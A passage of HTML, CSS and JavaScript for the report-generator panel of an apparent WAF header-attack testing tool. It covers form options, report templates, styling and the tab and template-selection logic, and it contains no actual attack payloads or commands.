                <button class="waf-report-tab" onclick="switchTab(this, 'waf-preview')">Preview</button>
                <button class="waf-report-tab" onclick="switchTab(this, 'waf-templates')">Templates</button>
                <button class="waf-report-tab" onclick="switchTab(this, 'waf-history')">History</button>
            </div>
            
            <!-- Options Tab Content -->
            <div id="waf-options" class="waf-report-tab-content active">
                <div class="waf-report-options-section">
                    <h3>Report Information</h3>
                    <div class="waf-report-option-group">
                        <label for="wafReportTitle">Report Title</label>
                        <input type="text" id="wafReportTitle" value="WAF Header Attack Test Report" placeholder="Enter report title">
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label for="wafCompanyName">Company Name</label>
                        <input type="text" id="wafCompanyName" placeholder="Enter company name">
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label for="wafReportAuthor">Author</label>
                        <input type="text" id="wafReportAuthor" placeholder="Enter report author">
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label>Report Format</label>
                        <div class="waf-report-radio-group">
                            <label class="waf-report-radio">
                                <input type="radio" name="wafReportFormat" value="xlsx" checked>
                                <span>Excel (.xlsx)</span>
                            </label>
                            <label class="waf-report-radio">
                                <input type="radio" name="wafReportFormat" value="csv">
                                <span>CSV</span>
                            </label>
                        </div>
                    </div>
                </div>
                
                <div class="waf-report-options-section">
                    <h3>Content Options</h3>
                    <div class="waf-report-checkbox-group">
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeExecutiveSummary" checked>
                            <span>Executive Summary</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeDetailedAnalysis" checked>
                            <span>Detailed Analysis</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeStatistics" checked>
                            <span>Statistics Dashboard</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeCharts" checked>
                            <span>Visualization Charts</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludePayloads" checked>
                            <span>Full Payloads</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeCurlCommands" checked>
                            <span>cURL Commands</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeRecommendations" checked>
                            <span>Remediation Recommendations</span>
                        </label>
                        <label class="waf-report-checkbox">
                            <input type="checkbox" id="wafIncludeShellScript" checked>
                            <span>Shell Script Generator</span>
                        </label>
                    </div>
                </div>
                
                <div class="waf-report-options-section">
                    <h3>Payload Options</h3>
                    <div class="waf-report-option-group">
                        <label for="wafRequestMethod">Request Method</label>
                        <select id="wafRequestMethod" class="waf-select">
                            <option value="GET">GET</option>
                            <option value="POST">POST</option>
                            <option value="PUT">PUT</option>
                            <option value="DELETE">DELETE</option>
                            <option value="HEAD">HEAD</option>
                            <option value="OPTIONS">OPTIONS</option>
                        </select>
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label>Additional Headers</label>
                        <div id="wafAdditionalHeaders" class="waf-additional-headers">
                            <div class="waf-header-row">
                                <input type="text" placeholder="Header name" class="waf-header-name">
                                <input type="text" placeholder="Header value" class="waf-header-value">
                                <button class="waf-header-remove" onclick="removeHeaderRow(this)">
                                    <i class="fas fa-times"></i>
                                </button>
                            </div>
                        </div>
                        <button class="waf-add-header" onclick="addHeaderRow()">
                            <i class="fas fa-plus"></i> Add Header
                        </button>
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label for="wafCurlFormat">cURL Format</label>
                        <select id="wafCurlFormat" class="waf-select">
                            <option value="basic">Basic</option>
                            <option value="verbose" selected>Verbose (-v)</option>
                            <option value="insecure">Ignore SSL (-k)</option>
                            <option value="full">Full Options (-v -k)</option>
                        </select>
                    </div>
                </div>
                
                <div class="waf-report-options-section">
                    <h3>Appearance</h3>
                    <div class="waf-report-option-group">
                        <label>Color Theme</label>
                        <div class="waf-report-color-options">
                            <label class="waf-report-color-option">
                                <input type="radio" name="wafColorTheme" value="professional" checked>
                                <span class="color-preview professional"></span>
                                <span>Professional</span>
                            </label>
                            <label class="waf-report-color-option">
                                <input type="radio" name="wafColorTheme" value="corporate">
                                <span class="color-preview corporate"></span>
                                <span>Corporate</span>
                            </label>
                            <label class="waf-report-color-option">
                                <input type="radio" name="wafColorTheme" value="technical">
                                <span class="color-preview technical"></span>
                                <span>Technical</span>
                            </label>
                            <label class="waf-report-color-option">
                                <input type="radio" name="wafColorTheme" value="security">
                                <span class="color-preview security"></span>
                                <span>Security</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="waf-report-option-group">
                        <label for="wafLogoUpload">Company Logo (optional)</label>
                        <input type="file" id="wafLogoUpload" accept="image/*">
                    </div>
                </div>
            </div>
            
            <!-- Preview Tab Content -->
            <div id="waf-preview" class="waf-report-tab-content">
                <div class="waf-report-preview-container">
                    <div class="waf-report-preview-header">
                        <select id="wafPreviewSheet" onchange="updateWafPreview()">
                            <option value="executiveSummary">Executive Summary</option>
                            <option value="detailedAnalysis">Detailed Analysis</option>
                            <option value="statistics">Statistics</option>
                            <option value="curlCommands">cURL Commands</option>
                            <option value="shellScript">Shell Script</option>
                        </select>
                        <div class="waf-report-preview-controls">
                            <button class="waf-preview-control" onclick="refreshWafPreview()">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    
                    <div class="waf-report-preview-content">
                        <div id="wafPreviewContent">
                            <!-- Preview content will be generated here -->
                            <div class="waf-preview-placeholder">
                                <i class="fas fa-table"></i>
                                <p>Select tests and configure options to generate preview</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Templates Tab Content -->
            <div id="waf-templates" class="waf-report-tab-content">
                <div class="waf-report-templates-grid">
                    <div class="waf-report-template-card" onclick="selectWafTemplate('executive')">
                        <div class="waf-template-thumbnail executive">
                            <i class="fas fa-briefcase"></i>
                        </div>
                        <div class="waf-template-info">
                            <h4>Executive Report</h4>
                            <p>Concise overview with key metrics and findings</p>
                        </div>
                        <div class="waf-template-select">
                            <i class="fas fa-check-circle"></i>
                        </div>
                    </div>
                    
                    <div class="waf-report-template-card" onclick="selectWafTemplate('technical')">
                        <div class="waf-template-thumbnail technical">
                            <i class="fas fa-code"></i>
                        </div>
                        <div class="waf-template-info">
                            <h4>Technical Deep Dive</h4>
                            <p>Comprehensive analysis with all technical details</p>
                        </div>
                        <div class="waf-template-select">
                            <i class="fas fa-check-circle"></i>
                        </div>
                    </div>
                    
                    <div class="waf-report-template-card" onclick="selectWafTemplate('compliance')">
                        <div class="waf-template-thumbnail compliance">
                            <i class="fas fa-clipboard-check"></i>
                        </div>
                        <div class="waf-template-info">
                            <h4>Compliance Report</h4>
                            <p>Security assessment with compliance focus</p>
                        </div>
                        <div class="waf-template-select">
                            <i class="fas fa-check-circle"></i>
                        </div>
                    </div>
                    
                    <div class="waf-report-template-card" onclick="selectWafTemplate('penetration')">
                        <div class="waf-template-thumbnail penetration">
                            <i class="fas fa-terminal"></i>
                        </div>
                        <div class="waf-template-info">
                            <h4>Penetration Test</h4>
                            <p>Detailed attack vectors with executable commands</p>
                        </div>
                        <div class="waf-template-select">
                            <i class="fas fa-check-circle"></i>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- History Tab Content -->
            <div id="waf-history" class="waf-report-tab-content">
                <div class="waf-report-history-empty">
                    <i class="fas fa-history"></i>
                    <p>Your report history will appear here</p>
                </div>
                <div class="waf-report-history-list" style="display: none;">
                    <!-- Will be populated dynamically -->
                </div>
            </div>
            
            <!-- Footer with Action Buttons -->
            <div class="waf-report-panel-actions">
                <button class="waf-report-action-button secondary" onclick="toggleReportPanel()">
                    <i class="fas fa-times"></i> Cancel
                </button>
                <button class="waf-report-action-button primary" onclick="generateAdvancedWafReport()">
                    <i class="fas fa-file-excel"></i> Generate Report
                </button>
            </div>
        </div>
    </div>




















































    
    <!-- Report Generation Progress Overlay -->
    <div id="wafReportProgress" class="waf-report-progress-overlay">
        <div class="waf-report-progress-dialog">
            <div class="waf-report-progress-icon">
                <i class="fas fa-cog fa-spin"></i>
            </div>
            <h3>Generating Report</h3>
            <div class="waf-report-progress-bar-container">
                <div id="wafReportProgressBar" class="waf-report-progress-bar"></div>
            </div>
            <div id="wafReportProgressStatus" class="waf-report-progress-status">Analyzing test data...</div>
        </div>
    </div>
</div>

<!-- Styles for the Report Generator -->
<style>
/* Main Container Styles */
.waf-report-generator-container {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    --primary-color: #0066cc;
    --primary-dark: #004c99;
    --primary-light: #cce0ff;
    --secondary-color: #2d3748;
    --success-color: #48bb78;
    --warning-color: #ed8936;
    --danger-color: #e53e3e;
    --text-color: #2d3748;
    --text-light: #718096;
    --border-color: #e2e8f0;
    --background-light: #f7fafc;
    --box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    --transition-speed: 0.3s;
}

/* Floating Action Button Styles */
.waf-report-fab {
    position: fixed;
    left: 24px;
    top: 50%;
    transform: translateY(-50%);
    z-index: 999;
    display: flex;
    align-items: center;
    transition: all var(--transition-speed) ease;
}

.waf-report-fab-button {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
    border: none;
    color: white;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 24px;
    cursor: pointer;
    box-shadow: var(--box-shadow);
    transition: all var(--transition-speed) ease;
    position: relative;
    overflow: hidden;
}

.waf-report-fab-button:after {
    content: '';
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(255, 255, 255, 0.1);
    top: 0;
    left: 0;
    border-radius: 50%;
    transform: scale(0);
    transition: all 0.3s ease;
}

.waf-report-fab-button:hover:after {
    transform: scale(1);
}

.waf-report-fab-button:hover {
    transform: scale(1.05);
    box-shadow: 0 6px 10px rgba(0, 0, 0, 0.2);
}

.waf-report-fab-button:active {
    transform: scale(0.95);
}

.waf-report-fab-label {
    background: var(--secondary-color);
    color: white;
    padding: 8px 16px;
    border-radius: 4px;
    margin-left: 16px;
    font-size: 14px;
    font-weight: 500;
    opacity: 0;
    transform: translateX(-10px);
    transition: all var(--transition-speed) ease;
    white-space: nowrap;
    box-shadow: var(--box-shadow);
    pointer-events: none;
}

.waf-report-fab:hover .waf-report-fab-label {
    opacity: 1;
    transform: translateX(0);
}

/* Pulse Animation */
.pulse-animation {
    animation: pulse 2s infinite;
}

@keyframes pulse {
    0% {
        box-shadow: 0 0 0 0 rgba(0, 102, 204, 0.4);
    }
    70% {
        box-shadow: 0 0 0 10px rgba(0, 102, 204, 0);
    }
    100% {
        box-shadow: 0 0 0 0 rgba(0, 102, 204, 0);
    }
}

/* Report Panel Styles */
.waf-report-panel {
    position: fixed;
    left: -520px;
    top: 0;
    width: 520px;
    height: 100vh;
    background: white;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
    z-index: 1000;
    transition: all var(--transition-speed) ease;
    display: flex;
    flex-direction: column;
    overflow: hidden;
}

.waf-report-panel.active {
    left: 0;
}

.waf-report-panel-header {
    padding: 20px;
    background: var(--primary-color);
    color: white;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.waf-report-panel-header h2 {
    margin: 0;
    font-size: 20px;
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 10px;
}

.waf-report-panel-close {
    background: transparent;
    border: none;
    color: white;
    font-size: 20px;
    cursor: pointer;
    width: 32px;
    height: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 4px;
    transition: all 0.2s ease;
}

.waf-report-panel-close:hover {
    background: rgba(255, 255, 255, 0.1);
}

.waf-report-panel-content {
    flex: 1;
    overflow-y: auto;
    display: flex;
    flex-direction: column;
}

/* Tab Navigation */
.waf-report-tabs {
    display: flex;
    border-bottom: 1px solid var(--border-color);
    background: var(--background-light);
}

.waf-report-tab {
    padding: 15px 20px;
    background: transparent;
    border: none;
    border-bottom: 3px solid transparent;
    color: var(--text-light);
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    flex: 1;
    text-align: center;
}

.waf-report-tab.active {
    border-bottom: 3px solid var(--primary-color);
    color: var(--primary-color);
}

.waf-report-tab:hover:not(.active) {
    background: rgba(0, 0, 0, 0.03);
    color: var(--text-color);
}

.waf-report-tab-content {
    display: none;
    padding: 20px;
    flex: 1;
    overflow-y: auto;
}

.waf-report-tab-content.active {
    display: block;
}

/* Report Options Styles */
.waf-report-options-section {
    margin-bottom: 25px;
    padding-bottom: 20px;
    border-bottom: 1px solid var(--border-color);
}

.waf-report-options-section:last-child {
    border-bottom: none;
    padding-bottom: 0;
}

.waf-report-options-section h3 {
    margin: 0 0 15px 0;
    font-size: 16px;
    font-weight: 600;
    color: var(--text-color);
}

.waf-report-option-group {
    margin-bottom: 15px;
}

.waf-report-option-group:last-child {
    margin-bottom: 0;
}

.waf-report-option-group label {
    display: block;
    margin-bottom: 6px;
    font-size: 14px;
    color: var(--text-color);
}

.waf-report-option-group input[type="text"],
.waf-select {
    width: 100%;
    padding: 10px 12px;
    border: 1px solid var(--border-color);
    border-radius: 4px;
    font-size: 14px;
    transition: all 0.2s ease;
}

.waf-report-option-group input[type="text"]:focus,
.waf-select:focus {
    border-color: var(--primary-color);
    box-shadow: 0 0 0 2px var(--primary-light);
    outline: none;
}

.waf-report-checkbox-group {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
}

.waf-report-checkbox {
    display: flex;
    align-items: center;
    cursor: pointer;
}

.waf-report-checkbox input {
    margin-right: 8px;
}

.waf-report-radio-group {
    display: flex;
    gap: 15px;
}

.waf-report-radio {
    display: flex;
    align-items: center;
    cursor: pointer;
}

.waf-report-radio input {
    margin-right: 8px;
}

/* Additional Headers Styles */
.waf-additional-headers {
    display: flex;
    flex-direction: column;
    gap: 10px;
    margin-bottom: 10px;
}

.waf-header-row {
    display: flex;
    gap: 10px;
}

.waf-header-name,
.waf-header-value {
    flex: 1;
    padding: 8px 12px;
    border: 1px solid var(--border-color);
    border-radius: 4px;
    font-size: 14px;
}

.waf-header-remove {
    background: var(--background-light);
    border: 1px solid var(--border-color);
    border-radius: 4px;
    width: 32px;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    color: var(--text-light);
    transition: all 0.2s ease;
}

.waf-header-remove:hover {
    background: #f1f1f1;
    color: var(--danger-color);
}

.waf-add-header {
    background: var(--background-light);
    border: 1px solid var(--border-color);
    border-radius: 4px;
    padding: 8px 12px;
    font-size: 14px;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.2s ease;
}

.waf-add-header:hover {
    background: #f1f1f1;
}

/* Color Theme Options */
.waf-report-color-options {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
}

.waf-report-color-option {
    display: flex;
    align-items: center;
    cursor: pointer;
    padding: 8px;
    border-radius: 4px;
    transition: all 0.2s ease;
}

.waf-report-color-option:hover {
    background: var(--background-light);
}

.color-preview {
    width: 24px;
    height: 24px;
    border-radius: 4px;
    margin-right: 10px;
}

.color-preview.professional {
    background: linear-gradient(135deg, #0066cc 0%, #004c99 100%);
}

.color-preview.corporate {
    background: linear-gradient(135deg, #2c5282 0%, #1a365d 100%);
}

.color-preview.technical {
    background: linear-gradient(135deg, #3182ce 0%, #2b6cb0 100%);
}

.color-preview.security {
    background: linear-gradient(135deg, #e53e3e 0%, #c53030 100%);
}

.color-preview.penetration {
    background: linear-gradient(135deg, #282828 0%, #1a1a1a 100%);
}

/* File Upload */
#wafLogoUpload {
    border: 1px dashed var(--border-color);
    padding: 12px;
    width: 100%;
    border-radius: 4px;
    background: var(--background-light);
    font-size: 14px;
}

/* Preview Tab Styles */
.waf-report-preview-container {
    height: 100%;
    display: flex;
    flex-direction: column;
    border: 1px solid var(--border-color);
    border-radius: 6px;
    overflow: hidden;
}

.waf-report-preview-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 12px 16px;
    background: var(--background-light);
    border-bottom: 1px solid var(--border-color);
}

#wafPreviewSheet {
    padding: 8px 12px;
    border-radius: 4px;
    border: 1px solid var(--border-color);
    font-size: 14px;
}

.waf-report-preview-controls {
    display: flex;
    gap: 10px;
}

.waf-preview-control {
    padding: 8px 12px;
    background: white;
    border: 1px solid var(--border-color);
    border-radius: 4px;
    font-size: 14px;
    cursor: pointer;
    transition: all 0.2s ease;
    display: flex;
    align-items: center;
    gap: 6px;
}

.waf-preview-control:hover {
    background: var(--background-light);
}

.waf-report-preview-content {
    flex: 1;
    overflow: auto;
    padding: 20px;
    background: white;
}

.waf-preview-placeholder {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 300px;
    color: var(--text-light);
}

.waf-preview-placeholder i {
    font-size: 48px;
    margin-bottom: 16px;
    opacity: 0.5;
}

.waf-preview-placeholder p {
    font-size: 16px;
}

/* Templates Tab Styles */
.waf-report-templates-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 16px;
}

.waf-report-template-card {
    border: 1px solid var(--border-color);
    border-radius: 6px;
    overflow: hidden;
    transition: all 0.2s ease;
    cursor: pointer;
    position: relative;
    background: white;
}

.waf-report-template-card:hover {
    transform: translateY(-2px);
    box-shadow: var(--box-shadow);
}

.waf-report-template-card.selected {
    border-color: var(--primary-color);
    box-shadow: 0 0 0 2px var(--primary-light);
}

.waf-template-thumbnail {
    height: 100px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: white;
    font-size: 36px;
}

.waf-template-thumbnail.executive {
    background: linear-gradient(135deg, #4c51bf 0%, #434190 100%);
}

.waf-template-thumbnail.technical {
    background: linear-gradient(135deg, #2b6cb0 0%, #2c5282 100%);
}

.waf-template-thumbnail.compliance {
    background: linear-gradient(135deg, #38a169 0%, #2f855a 100%);
}

.waf-template-thumbnail.penetration {
    background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
}

.waf-template-info {
    padding: 12px;
}

.waf-template-info h4 {
    margin: 0 0 4px 0;
    font-size: 16px;
    font-weight: 600;
}

.waf-template-info p {
    margin: 0;
    font-size: 14px;
    color: var(--text-light);
}

.waf-template-select {
    position: absolute;
    top: 10px;
    right: 10px;
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: white;
    display: flex;
    align-items: center;
    justify-content: center;
    color: var(--primary-color);
    opacity: 0;
    transition: all 0.2s ease;
}

.waf-report-template-card.selected .waf-template-select {
    opacity: 1;
}

/* History Tab Styles */
.waf-report-history-empty {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 300px;
    color: var(--text-light);
}

.waf-report-history-empty i {
    font-size: 48px;
    margin-bottom: 16px;
    opacity: 0.5;
}

.waf-report-history-empty p {
    font-size: 16px;
}

.waf-report-history-list {
    display: flex;
    flex-direction: column;
    gap: 12px;
}

.waf-history-item {
    display: flex;
    align-items: center;
    gap: 12px;
    padding: 12px;
    background: white;
    border: 1px solid var(--border-color);
    border-radius: 6px;
    transition: all 0.2s ease;
}

.waf-history-item:hover {
    box-shadow: var(--box-shadow);
}

.waf-history-icon {
    width: 40px;
    height: 40px;
    border-radius: 8px;
    background: var(--primary-light);
    color: var(--primary-color);
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 18px;
}

.waf-history-details {
    flex: 1;
}

.waf-history-details h4 {
    margin: 0 0 4px 0;
    font-size: 16px;
    font-weight: 500;
}

.waf-history-details p {
    margin: 0;
    font-size: 14px;
    color: var(--text-light);
}

.waf-history-actions {
    display: flex;
    gap: 8px;
}

.waf-history-actions button {
    width: 32px;
    height: 32px;
    border-radius: 4px;
    border: 1px solid var(--border-color);
    background: white;
    color: var(--text-light);
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.2s ease;
}

.waf-history-actions button:hover {
    background: var(--background-light);
    color: var(--primary-color);
}

/* Action Buttons */
.waf-report-panel-actions {
    padding: 16px 20px;
    border-top: 1px solid var(--border-color);
    display: flex;
    justify-content: flex-end;
    gap: 12px;
}

.waf-report-action-button {
    padding: 10px 16px;
    border-radius: 4px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    display: flex;
    align-items: center;
    gap: 8px;
    transition: all 0.2s ease;
}

.waf-report-action-button.primary {
    background: var(--primary-color);
    color: white;
    border: none;
}

.waf-report-action-button.primary:hover {
    background: var(--primary-dark);
}

.waf-report-action-button.secondary {
    background: white;
    color: var(--text-color);
    border: 1px solid var(--border-color);
}

.waf-report-action-button.secondary:hover {
    background: var(--background-light);
}

/* Progress Overlay */
.waf-report-progress-overlay {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(0, 0, 0, 0.5);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 1010;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
}

.waf-report-progress-overlay.active {
    opacity: 1;
    pointer-events: auto;
}

.waf-report-progress-dialog {
    background: white;
    border-radius: 8px;
    padding: 24px;
    width: 400px;
    max-width: 90%;
    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    text-align: center;
}



.waf-curl-payload {
    margin-bottom: 10px;
    padding: 8px 12px;
    background: #f8f9fa;
    border-radius: 4px;
    font-family: monospace;
    overflow-x: auto;
    white-space: nowrap;
}

.waf-curl-command {
    padding: 8px 12px;
    background: #2d3748;
    color: #e2e8f0;
    border-radius: 4px;
    font-family: monospace;
    overflow-x: auto;
    white-space: nowrap;
}

.waf-curl-payload code, .waf-curl-command code {
    font-family: monospace;
}

.waf-report-progress-icon {
    font-size: 48px;
    color: var(--primary-color);
    margin-bottom: 16px;
}

.waf-report-progress-dialog h3 {
    margin: 0 0 20px 0;
    font-size: 20px;
    font-weight: 600;
}

.waf-report-progress-bar-container {
    height: 8px;
    background: var(--background-light);
    border-radius: 4px;
    margin-bottom: 12px;
    overflow: hidden;
}

.waf-report-progress-bar {
    height: 100%;
    background: var(--primary-color);
    width: 0%;
    transition: width 0.3s ease;
}

.waf-report-progress-status {
    font-size: 14px;
    color: var(--text-light);
}

/* Report Success Message */
.waf-report-success-message {
    position: fixed;
    top: 20px;
    right: 20px;
    z-index: 1010;
    animation: slideIn 0.3s ease forwards;
}

.waf-report-success-content {
    background: var(--success-color);
    color: white;
    padding: 15px 20px;
    border-radius: 4px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
    display: flex;
    align-items: center;
    gap: 10px;
    font-size: 16px;
}

.waf-report-success-content i {
    font-size: 20px;
}

.waf-report-success-content button {
    background: none;
    border: none;
    color: white;
    font-size: 20px;
    cursor: pointer;
    margin-left: 10px;
    padding: 0;
    line-height: 1;
}

@keyframes slideIn {
    from {
        transform: translateX(100%);
        opacity: 0;
    }
    to {
        transform: translateX(0);
        opacity: 1;
    }
}

/* Preview Content Styles */
.waf-preview-executive-summary {
    font-family: Arial, sans-serif;
    color: #333;
}

.waf-preview-header {
    margin-bottom: 20px;
    padding-bottom: 20px;
    border-bottom: 1px solid #eee;
}

.waf-preview-header h2 {
    margin: 0 0 10px 0;
    color: #2d3748;
}

.waf-preview-header h3 {
    margin: 0 0 10px 0;
    color: #4a5568;
    font-weight: 500;
}

.waf-preview-date {
    color: #718096;
    font-size: 14px;
    margin: 0;
}

.waf-preview-summary-card {
    background: #fff;
    border: 1px solid #e2e8f0;
    border-radius: 8px;
    padding: 20px;
    margin-bottom: 20px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
}

.waf-preview-summary-card h3 {
    margin: 0 0 15px 0;
    color: #2d3748;
    font-size: 18px;
    border-bottom: 1px solid #eee;
    padding-bottom: 10px;
}

.waf-preview-summary-stats {
    display: flex;
    justify-content: space-between;
    margin-top: 20px;
    flex-wrap: wrap;
}

.waf-summary-stat {
    text-align: center;
    padding: 15px;
    flex: 1;
    min-width: 100px;
    border-radius: 6px;
    background: #f7fafc;
}

.waf-summary-stat.critical {
    background: #fff5f5;
    color: #e53e3e;
}

.waf-summary-stat.high {
    background: #fffaf0;
    color: #dd6b20;
}

.waf-summary-stat.medium {
    background: #fffbeb;
    color: #d97706;
}

.waf-summary-stat.low {
    background: #f0fff4;
    color: #38a169;
}

.waf-stat-value {
    font-size: 28px;
    font-weight: bold;
    margin-bottom: 5px;
}

.waf-stat-label {
    font-size: 14px;
    color: inherit;
}

.waf-key-findings {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

.waf-finding {
    display: flex;
    gap: 15px;
}

.waf-finding-icon {
    width: 40px;
    height: 40px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    font-size: 18px;
}

.waf-finding-icon.critical {
    background: #fff5f5;
    color: #e53e3e;
}

.waf-finding-icon.high {
    background: #fffaf0;
    color: #dd6b20;
}

.waf-finding-icon.medium {
    background: #fffbeb;
    color: #d97706;
}

.waf-finding-icon.success {
    background: #f0fff4;
    color: #38a169;
}

.waf-finding-content h4 {
    margin: 0 0 5px 0;
    font-size: 16px;
}

.waf-finding-content p {
    margin: 0;
    color: #718096;
}

/* Responsive Styles */
@media (max-width: 768px) {
    .waf-report-fab {
        left: 16px;
        bottom: 16px;
        top: auto;
        transform: none;
    }
    
    .waf-report-fab:hover {
        transform: none;
    }
    
    .waf-report-panel {
        width: 100%;
        left: -100%;
    }
    
    .waf-report-checkbox-group,
    .waf-report-color-options,
    .waf-report-templates-grid,
    .waf-statistics-grid {
        grid-template-columns: 1fr;
    }
    
    .waf-header-row {
        flex-direction: column;
    }
    
    .waf-header-remove {
        align-self: flex-end;
    }
}
</style>

<!-- JavaScript for the Report Generator -->
<script>
// Load required libraries dynamically
function loadScripts() {
    const scripts = [
        "https://cdn.sheetjs.com/xlsx-0.20.3/package/dist/xlsx.full.min.js",
        "https://cdn.jsdelivr.net/npm/file-saver@2.0.5/dist/FileSaver.min.js",
        "https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"
    ];

    const loadPromises = scripts.map(src => {
        return new Promise((resolve, reject) => {
            if (document.querySelector(`script[src="${src}"]`)) {
                resolve();
                return;
            }
            
            const script = document.createElement('script');
            script.src = src;
            script.async = true;
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
        });
    });

    return Promise.all(loadPromises);
}

// Global state
let wafReportPanelOpen = false;
let wafSelectedTemplate = 'executive';
let wafReportHistory = [];
let wafCompanyLogo = null;

// Initialize report generator
function initReportGenerator() {
    // Check if panel already exists
    if (document.getElementById('wafReportPanel')) {
        console.log('Report generator already initialized');
        return;
    }
    
    // Add initial header row
    addHeaderRow();
    
    // Set up logo upload listener
    const logoUpload = document.getElementById('wafLogoUpload');
    if (logoUpload) {
        logoUpload.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    wafCompanyLogo = event.target.result;
                };
                reader.readAsDataURL(file);
            }
        });
    }
}

// Toggle the report panel
function toggleReportPanel() {
    const panel = document.getElementById('wafReportPanel');
    wafReportPanelOpen = !wafReportPanelOpen;
    
    if (wafReportPanelOpen) {
        panel.classList.add('active');
        document.getElementById('wafReportFabButton').classList.remove('pulse-animation');
    } else {
        panel.classList.remove('active');
    }
}

// Switch between tabs
function switchTab(tabButton, tabId) {
    // Update tab buttons
    document.querySelectorAll('.waf-report-tab').forEach(tab => {
        tab.classList.remove('active');
    });
    tabButton.classList.add('active');
    
    // Update tab content
    document.querySelectorAll('.waf-report-tab-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById(tabId).classList.add('active');
    
    // If switching to preview tab, generate a preview
    if (tabId === 'waf-preview') {
        refreshWafPreview();
    }
}

// Add a new header row
function addHeaderRow() {
    const headerContainer = document.getElementById('wafAdditionalHeaders');
    if (!headerContainer) return;
    
    const newRow = document.createElement('div');
    newRow.className = 'waf-header-row';
    newRow.innerHTML = `
        <input type="text" placeholder="Header name" class="waf-header-name">
        <input type="text" placeholder="Header value" class="waf-header-value">
        <button class="waf-header-remove" onclick="removeHeaderRow(this)">
            <i class="fas fa-times"></i>
        </button>
    `;
    headerContainer.appendChild(newRow);
}

// Remove a header row
function removeHeaderRow(button) {
    const row = button.closest('.waf-header-row');
    row.remove();
}

// Select a report template
function selectWafTemplate(template) {
    wafSelectedTemplate = template;
    
    // Update UI
    document.querySelectorAll('.waf-report-template-card').forEach(card => {
        card.classList.remove('selected');
    });
    
    const selectedCard = document.querySelector(`.waf-report-template-card[onclick*="${template}"]`);
    if (selectedCard) {
        selectedCard.classList.add('selected');
    }
    
    // Update options based on template
    updateOptionsFromTemplate(template);
    
    // Switch to options tab
    const optionsTab = document.querySelector('.waf-report-tab[onclick*="waf-options"]');
    switchTab(optionsTab, 'waf-options');
}

// Update options based on selected template
function updateOptionsFromTemplate(template) {
    // Default options for all templates
    document.getElementById('wafIncludeExecutiveSummary').checked = true;
    document.getElementById('wafIncludeDetailedAnalysis').checked = true;
    document.getElementById('wafIncludeStatistics').checked = true;
    document.getElementById('wafIncludeCharts').checked = true;
    document.getElementById('wafIncludePayloads').checked = true;
    document.getElementById('wafIncludeCurlCommands').checked = true;
    document.getElementById('wafIncludeRecommendations').checked = true;
    document.getElementById('wafIncludeShellScript').checked = true;
    
    // Template specific settings
    switch(template) {
        case 'executive':
            document.getElementById('wafReportTitle').value = 'WAF Security Executive Summary';
            document.getElementById('wafIncludePayloads').checked = false;
            document.getElementById('wafIncludeCurlCommands').checked = false;
            document.getElementById('wafIncludeShellScript').checked = false;
            document.querySelector('input[name="wafColorTheme"][value="professional"]').checked = true;
            break;
            
        case 'technical':
            document.getElementById('wafReportTitle').value = 'WAF Header Attack Technical Analysis';
